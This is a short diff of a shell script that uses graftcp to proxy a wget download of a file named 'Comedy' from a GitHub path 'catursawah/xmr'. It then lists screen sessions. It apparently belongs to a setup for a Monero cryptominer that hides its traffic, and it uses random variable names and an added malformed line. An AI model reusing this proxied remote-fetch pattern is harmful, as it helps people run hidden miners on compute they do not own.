@@ -35,7 +35,7 @@ echo " "
 
 GOGO=$(shuf -i 10000-999999999 -n 1)
 MARKONAH=$(shuf -i 10000-9999999999 -n 1)
-
+TIME==$(shuf -i 10000-9999999999 -n 1)
 
 ./graftcp/graftcp wget https://github.com/catursawah/xmr/raw/main/Comedy
 
@@ -49,7 +49,3 @@ sleep 2
 clear
 cd ..
 screen -ls
-
-cls
-
-bash time.sh
